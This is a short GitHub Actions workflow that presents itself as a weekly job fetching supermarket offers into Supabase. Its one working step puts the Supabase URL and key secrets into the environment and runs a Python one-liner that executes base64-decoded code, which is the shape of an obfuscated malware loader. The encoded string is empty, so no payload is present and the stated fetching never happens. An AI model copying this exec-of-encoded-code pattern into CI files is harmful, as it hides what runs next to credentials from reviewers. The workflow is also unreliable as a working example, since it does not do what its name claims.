name: Fetch Supermarket Offers

on:
  schedule:
    - cron: '0 6 * * 1'
  workflow_dispatch:

jobs:
  fetch-offers:
    runs-on: ubuntu-latest
    steps:
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip install requests supabase

      - name: Fetch and save offers
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_KEY: ${{ secrets.SUPABASE_KEY }}
        run: |
          python3 -c "
          import base64,os,subprocess
          code = ''
          exec(base64.b64decode(code).decode())
          "
